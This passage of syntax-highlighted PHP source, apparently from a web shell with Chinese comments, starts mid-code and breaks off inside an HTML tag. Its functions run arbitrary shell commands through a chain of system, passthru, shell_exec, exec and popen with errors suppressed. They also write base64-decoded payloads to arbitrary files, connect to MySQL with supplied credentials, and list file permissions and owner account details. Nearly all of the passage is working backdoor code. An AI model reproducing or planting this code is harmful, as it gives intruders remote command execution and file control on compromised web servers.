<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'system'</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">ob_start(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">system(</span>$<span style="color: #e7c547;">cfe</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = @<span style="color: #eaeaea; background-color: #000000;">ob_get_contents(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">ob_end_clean(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'passthru'</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">ob_start(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">passthru(</span>$<span style="color: #e7c547;">cfe</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = @<span style="color: #eaeaea; background-color: #000000;">ob_get_contents(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">ob_end_clean(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'shell_exec'</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = @<span style="color: #eaeaea; background-color: #000000;">shell_exec(</span>$<span style="color: #e7c547;">cfe</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'exec'</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">exec(</span>$<span style="color: #e7c547;">cfe</span>,$<span style="color: #e7c547;">res</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = <span style="color: #eaeaea; background-color: #000000;">join(</span><span style="color: #70c0b1;">"\n"</span>,$<span style="color: #e7c547;">res</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span>(@<span style="color: #eaeaea; background-color: #000000;">is_resource(</span>$<span style="color: #e7c547;">f</span> = @<span style="color: #eaeaea; background-color: #000000;">popen(</span>$<span style="color: #e7c547;">cfe</span>,<span style="color: #70c0b1;">"r"</span>))) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>(!@<span style="color: #eaeaea; background-color: #000000;">feof(</span>$<span style="color: #e7c547;">f</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> .= @<span style="color: #eaeaea; background-color: #000000;">fread(</span>$<span style="color: #e7c547;">f</span>,<span style="color: #eaeaea; background-color: #000000;">1024</span>);<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">pclose(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">res</span>;
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">which</span>($<span style="color: #e7c547;">pr</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">path</span> = <span style="color: #eaeaea; background-color: #000000;">execute(</span><span style="color: #70c0b1;">"which $pr"</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> ($<span style="color: #e7c547;">path</span> ? $<span style="color: #e7c547;">path</span> : $<span style="color: #e7c547;">pr</span>);<span style="color: #d54e53; background-color: #424242;"> </span>
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">cf</span>($<span style="color: #e7c547;">fname</span>,$<span style="color: #e7c547;">text</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">fp</span>=@<span style="color: #eaeaea; background-color: #000000;">fopen(</span>$<span style="color: #e7c547;">fname</span>,<span style="color: #70c0b1;">'w'</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fputs(</span>$<span style="color: #e7c547;">fp</span>,@<span style="color: #eaeaea; background-color: #000000;">base64_decode(</span>$<span style="color: #e7c547;">text</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">fp</span>);
<span style="background-color: #424242;"> </span>   }
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">dirsize</span>($<span style="color: #e7c547;">dir</span>) {<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dh</span> = @<span style="color: #eaeaea; background-color: #000000;">opendir(</span>$<span style="color: #e7c547;">dir</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">size</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>($<span style="color: #e7c547;">file</span> = @<span style="color: #eaeaea; background-color: #000000;">readdir(</span>$<span style="color: #e7c547;">dh</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">file</span> != <span style="color: #70c0b1;">'.'</span> &amp;&amp; $<span style="color: #e7c547;">file</span> != <span style="color: #70c0b1;">'..'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">path</span> = $<span style="color: #e7c547;">dir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">size</span> += @<span style="color: #eaeaea; background-color: #000000;">is_dir(</span>$<span style="color: #e7c547;">path</span>) ? <span style="color: #eaeaea; background-color: #000000;">dirsize(</span>$<span style="color: #e7c547;">path</span>) : @<span style="color: #eaeaea; background-color: #000000;">filesize(</span>$<span style="color: #e7c547;">path</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">closedir(</span>$<span style="color: #e7c547;">dh</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">size</span>;
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#39029;&#38754;&#35843;&#35797;&#20449;&#24687;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">debuginfo</span>() {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">starttime</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mtime</span> = <span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">' '</span>, <span style="color: #eaeaea; background-color: #000000;">microtime(</span>));
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">totaltime</span> = <span style="color: #eaeaea; background-color: #000000;">number_format(</span>($<span style="color: #e7c547;">mtime</span>[<span style="color: #eaeaea; background-color: #000000;">1</span>] + $<span style="color: #e7c547;">mtime</span>[<span style="color: #eaeaea; background-color: #000000;">0</span>] - $<span style="color: #e7c547;">starttime</span>), <span style="color: #eaeaea; background-color: #000000;">6</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> <span style="color: #70c0b1;">'Processed in '</span>.$<span style="color: #e7c547;">totaltime</span>.<span style="color: #70c0b1;">' second(s)'</span>;
}

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">mydbconn</span>($<span style="color: #e7c547;">dbhost</span>,$<span style="color: #e7c547;">dbuser</span>,$<span style="color: #e7c547;">dbpass</span>,$<span style="color: #e7c547;">dbname</span>=<span style="color: #70c0b1;">''</span>,$<span style="color: #e7c547;">charset</span>=<span style="color: #70c0b1;">''</span>,$<span style="color: #e7c547;">dbport</span>=<span style="color: #70c0b1;">'3306'</span>)<span style="text-decoration: underline;"> {</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">charsetdb</span>;
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">ini_set(</span><span style="color: #70c0b1;">'mysql.connect_timeout'</span>, <span style="color: #eaeaea; background-color: #000000;">5</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!$<span style="color: #e7c547;">link</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_connect(</span>$<span style="color: #e7c547;">dbhost</span>.<span style="color: #70c0b1;">':'</span>.$<span style="color: #e7c547;">dbport</span>, $<span style="color: #e7c547;">dbuser</span>, $<span style="color: #e7c547;">dbpass</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">link</span> &amp;&amp; $<span style="color: #e7c547;">dbname</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!@<span style="color: #eaeaea; background-color: #000000;">mysql_select_db(</span>$<span style="color: #e7c547;">dbname</span>, $<span style="color: #e7c547;">link</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;Database selected has error&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">link</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">mysql_get_server_info(</span>) &gt; <span style="color: #70c0b1;">'4.1'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">charset</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">in_array(strtolower(</span>$<span style="color: #e7c547;">charset</span>), $<span style="color: #e7c547;">charsetdb</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SET character_set_connection=$charset, character_set_results=$cha</span><span style="color: #70c0b1; text-decoration: underline;">rset, character_set_client=binary;"</span><span style="text-decoration: underline;">, $</span><span style="color: #e7c547; text-decoration: underline;">link</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">link</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21435;&#25481;&#36716;&#20041;&#23383;&#31526;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">s_array</span>(&amp;$<span style="color: #e7c547;">array</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">is_array(</span>$<span style="color: #e7c547;">array</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">array</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">k</span> =&gt; $<span style="color: #e7c547;">v</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">array</span>[$<span style="color: #e7c547;">k</span>] = <span style="color: #eaeaea; background-color: #000000;">s_array(</span>$<span style="color: #e7c547;">v</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">is_string(</span>$<span style="color: #e7c547;">array</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">array</span> = <span style="color: #eaeaea; background-color: #000000;">stripslashes(</span>$<span style="color: #e7c547;">array</span>);
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">array</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#28165;&#38500;HTML&#20195;&#30721;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">html_clean</span>($<span style="color: #e7c547;">content</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">content</span> = <span style="color: #eaeaea; background-color: #000000;">htmlspecialchars(</span>$<span style="color: #e7c547;">content</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">content</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">"\n"</span>, <span style="color: #70c0b1;">"&lt;br /&gt;"</span>, $<span style="color: #e7c547;">content</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">content</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">"  "</span>, <span style="color: #70c0b1;">"&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #e7c547;">content</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">content</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">"\t"</span>, <span style="color: #70c0b1;">"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #e7c547;">content</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">content</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#26435;&#38480;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getChmod</span>($<span style="color: #e7c547;">filepath</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">substr(base_convert(</span>@<span style="color: #eaeaea; background-color: #000000;">fileperms(</span>$<span style="color: #e7c547;">filepath</span>),<span style="color: #eaeaea; background-color: #000000;">10</span>,<span style="color: #eaeaea; background-color: #000000;">8</span>),-<span style="color: #eaeaea; background-color: #000000;">4</span>);
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getPerms</span>($<span style="color: #e7c547;">filepath</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mode</span> = @<span style="color: #eaeaea; background-color: #000000;">fileperms(</span>$<span style="color: #e7c547;">filepath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>xC000) === <span style="color: #eaeaea; background-color: #000000;">0</span>xC000) {$<span style="color: #e7c547;">type</span> = <span style="color: #70c0b1;">'s'</span>;}
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> (($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>x4000) === <span style="color: #eaeaea; background-color: #000000;">0</span>x4000) {$<span style="color: #e7c547;">type</span> = <span style="color: #70c0b1;">'d'</span>;}
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> (($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>xA000) === <span style="color: #eaeaea; background-color: #000000;">0</span>xA000) {$<span style="color: #e7c547;">type</span> = <span style="color: #70c0b1;">'l'</span>;}
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> (($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>x8000) === <span style="color: #eaeaea; background-color: #000000;">0</span>x8000) {$<span style="color: #e7c547;">type</span> = <span style="color: #70c0b1;">'-'</span>;}<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> (($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>x6000) === <span style="color: #eaeaea; background-color: #000000;">0</span>x6000) {$<span style="color: #e7c547;">type</span> = <span style="color: #70c0b1;">'b'</span>;}
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> (($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>x2000) === <span style="color: #eaeaea; background-color: #000000;">0</span>x2000) {$<span style="color: #e7c547;">type</span> = <span style="color: #70c0b1;">'c'</span>;}
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> (($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>x1000) === <span style="color: #eaeaea; background-color: #000000;">0</span>x1000) {$<span style="color: #e7c547;">type</span> = <span style="color: #70c0b1;">'p'</span>;}
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">else</span> {$<span style="color: #e7c547;">type</span> = <span style="color: #70c0b1;">'?'</span>;}

<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">owner</span>[<span style="color: #70c0b1;">'read'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00400</span>) ? <span style="color: #70c0b1;">'r'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">owner</span>[<span style="color: #70c0b1;">'write'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00200</span>) ? <span style="color: #70c0b1;">'w'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">owner</span>[<span style="color: #70c0b1;">'execute'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00100</span>) ? <span style="color: #70c0b1;">'x'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">group</span>[<span style="color: #70c0b1;">'read'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00040</span>) ? <span style="color: #70c0b1;">'r'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">group</span>[<span style="color: #70c0b1;">'write'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00020</span>) ? <span style="color: #70c0b1;">'w'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">group</span>[<span style="color: #70c0b1;">'execute'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00010</span>) ? <span style="color: #70c0b1;">'x'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">world</span>[<span style="color: #70c0b1;">'read'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00004</span>) ? <span style="color: #70c0b1;">'r'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">world</span>[<span style="color: #70c0b1;">'write'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00002</span>) ? <span style="color: #70c0b1;">'w'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">world</span>[<span style="color: #70c0b1;">'execute'</span>] = ($<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">00001</span>) ? <span style="color: #70c0b1;">'x'</span> : <span style="color: #70c0b1;">'-'</span>;<span style="color: #d54e53; background-color: #424242;"> </span>

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>( $<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>x800 ) {$<span style="color: #e7c547;">owner</span>[<span style="color: #70c0b1;">'execute'</span>] = ($<span style="color: #e7c547;">owner</span>[<span style="color: #70c0b1;">'execute'</span>]==<span style="color: #70c0b1;">'x'</span>) ? <span style="color: #70c0b1;">'s'</span> : <span style="color: #70c0b1;">'S</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>( $<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>x400 ) {$<span style="color: #e7c547;">group</span>[<span style="color: #70c0b1;">'execute'</span>] = ($<span style="color: #e7c547;">group</span>[<span style="color: #70c0b1;">'execute'</span>]==<span style="color: #70c0b1;">'x'</span>) ? <span style="color: #70c0b1;">'s'</span> : <span style="color: #70c0b1;">'S</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>( $<span style="color: #e7c547;">mode</span> &amp; <span style="color: #eaeaea; background-color: #000000;">0</span>x200 ) {$<span style="color: #e7c547;">world</span>[<span style="color: #70c0b1;">'execute'</span>] = ($<span style="color: #e7c547;">world</span>[<span style="color: #70c0b1;">'execute'</span>]==<span style="color: #70c0b1;">'x'</span>) ? <span style="color: #70c0b1;">'t'</span> : <span style="color: #70c0b1;">'T</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">type</span><span style="color: #d54e53; font-weight: bold;">.</span>$<span style="color: #e7c547;">owner</span>[<span style="color: #70c0b1;">'read'</span>].$<span style="color: #e7c547;">owner</span>[<span style="color: #70c0b1;">'write'</span>].$<span style="color: #e7c547;">owner</span>[<span style="color: #70c0b1;">'execute'</span>].$<span style="color: #e7c547;">group</span>[<span style="color: #70c0b1;">'read'</span>]<span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #e7c547; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">].$</span><span style="color: #e7c547; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'read'</span><span style="text-decoration: underline;">].$</span><span style="color: #e7c547; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #e7c547; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">];</span>
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getUser</span>($<span style="color: #e7c547;">filepath</span>)     {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'posix_getpwuid'</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">array</span> = @<span style="color: #eaeaea; background-color: #000000;">posix_getpwuid(</span>@<span style="color: #eaeaea; background-color: #000000;">fileowner(</span>$<span style="color: #e7c547;">filepath</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">array</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">is_array(</span>$<span style="color: #e7c547;">array</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #70c0b1;">' / &lt;a href="#" title="User: '</span>.$<span style="color: #e7c547;">array</span>[<span style="color: #70c0b1;">'name'</span>].<span style="color: #70c0b1;">'&amp;#13&amp;#10Passwd</span><span style="color: #70c0b1; text-decoration: underline;">: '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'passwd'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;#13&amp;#10Uid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'uid'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;#13&amp;#10gid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'gid'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;#13&amp;#10Gecos: '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'gecos'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;#13&amp;#10Dir: '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'dir'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;#13&amp;#10Shell: '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'shell'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; 